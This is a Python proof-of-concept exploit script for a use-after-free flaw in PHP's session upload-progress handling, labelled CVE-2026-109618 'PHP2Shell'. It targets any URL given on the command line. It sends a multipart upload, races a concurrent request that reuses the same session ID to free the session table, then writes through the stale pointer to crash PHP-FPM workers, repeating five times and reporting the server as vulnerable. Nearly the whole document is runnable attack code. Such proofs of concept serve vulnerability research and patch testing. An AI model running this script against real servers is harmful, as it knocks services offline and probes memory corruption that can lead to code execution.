#!/usr/bin/env python3
"""
CVE-2026-109618 — PHP2Shell UAF Crash PoC (PHP-FPM compatible)
Demonstrates the heap use-after-free vulnerability via session.upload_progress.

Attack flow:
  1. Send multipart POST with PHP_SESSION_UPLOAD_PROGRESS + large payload
     to trigger upload progress handler caching of session pointers
  2. Concurrent request with same PHPSESSID triggers session reinit,
     freeing the HashTable while upload handler still holds stale pointers
  3. Continued upload writes through dangling pointers → UAF

On a vulnerable PHP-FPM setup:
  - Worker SIGSEGV/SIGABRT → 502/503 from upstream
  - php-fpm automatically restarts the crashed worker

Usage:
  python3 splat_poc.py <target_url> [stall_seconds]

Example:
  python3 splat_poc.py https://example.com/index.php 0.35
"""

import socket
import ssl
import threading
import time
import sys
import random
import string
from urllib.parse import urlparse


def rand_str(n=16):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def build_multipart_head(boundary, filename):
    """Leading multipart bytes: PHP_SESSION_UPLOAD_PROGRESS field + file start."""
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"php2shell_trigger_{rand_str(8)}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode()


def build_multipart_tail(boundary):
    return f"\r\n--{boundary}--\r\n".encode()


def make_socket(host, port, use_tls):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


def force_session_reinit(host, port, path, sessid, use_tls, host_header):
    """Send concurrent GET with same PHPSESSID to force session reinit (frees HashTable)."""
    try:
        s = make_socket(host, port, use_tls)
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Cookie: PHPSESSID={sessid}\r\n"
            f"Connection: close\r\n\r\n"
        )
        s.send(req.encode())
        resp = s.recv(4096)
        s.close()
        return resp
    except Exception as e:
        return str(e).encode()


def trigger_uaf(host, port, path, sessid, stall, use_tls, host_header):
    boundary = rand_str(24)
    filename = rand_str(8) + ".bin"

    chunk1 = b"A" * 8192   # prime the progress pointer cache
    chunk2 = b"B" * 16384  # post-free write through stale pointer

    head = build_multipart_head(boundary, filename)
    tail = build_multipart_tail(boundary)
    body_len = len(head) + len(chunk1) + len(chunk2) + len(tail)

    http_hdr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"Cookie: PHPSESSID={sessid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {body_len}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    try:
        s = make_socket(host, port, use_tls)

        # Step 1: send headers + multipart head + chunk-1
        s.send(http_hdr + head + chunk1)
        print(f"[*] Chunk-1 sent ({len(chunk1)} B) — session pointer now cached")

        # Step 2: fire concurrent reinit
        print(f"[*] Firing concurrent reinit (same PHPSESSID)...")
        t = threading.Thread(
            target=force_session_reinit,
            args=(host, port, path, sessid, use_tls, host_header)
        )
        t.daemon = True
        t.start()

        # Step 3: stall
        print(f"[*] Stalling {stall}s for HashTable free...")
        time.sleep(stall)
        t.join(timeout=3)

        # Step 4: write through stale pointer
        print(f"[*] Sending chunk-2 through stale pointer — UAF write")
        s.send(chunk2 + tail)

        try:
            resp = s.recv(4096)
            status_line = resp.split(b"\r\n")[0].decode(errors="ignore")
            code = status_line.split(" ")[1] if len(status_line.split(" ")) > 1 else "?"
            print(f"\n[*] Response: {status_line}")

            if code in ("500", "502", "503"):
                print("[+] SERVER ERROR — crash / UAF likely triggered!")
                return True
            elif code == "200":
                print("[?] HTTP 200 — crash may be silent, try adjusting stall")
                return False
            else:
                print(f"[?] Unexpected status {code}")
                return False
        except socket.timeout:
            print("[+] Socket timeout — server likely crashed (strong UAF signal)")
            return True
        finally:
            s.close()

    except ConnectionRefusedError:
        print(f"[-] Connection refused — {host}:{port}")
        return False
    except Exception as exc:
        print(f"[-] Exception: {exc}")
        return False


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    url = sys.argv[1]
    stall = float(sys.argv[2]) if len(sys.argv) > 2 else 0.35

    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    use_tls = parsed.scheme == "https"
    host_header = parsed.netloc
    sessid = rand_str(26)

    print("=" * 60)
    print("  CVE-2026-109618 — PHP2Shell UAF Crash PoC")
    print("=" * 60)
    print(f"  Target  : {url}")
    print(f"  Host    : {host}:{port}")
    print(f"  TLS     : {use_tls}")
    print(f"  Session : {sessid}")
    print(f"  Stall   : {stall}s")
    print()

    attempts = 5
    crashes = 0
    for i in range(attempts):
        print(f"\n--- Attempt {i+1}/{attempts} ---")
        sessid = rand_str(26)
        if trigger_uaf(host, port, path, sessid, stall, use_tls, host_header):
            crashes += 1
        time.sleep(0.5)

    print(f"\n{'='*60}")
    print(f"  Results: {crashes}/{attempts} attempts triggered server error")
    if crashes > 0:
        print("  [VULNERABLE] PHP2Shell UAF crash confirmed")
    else:
        print("  [UNCERTAIN] No clear crash signal — may need tuning or target may be patched")
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
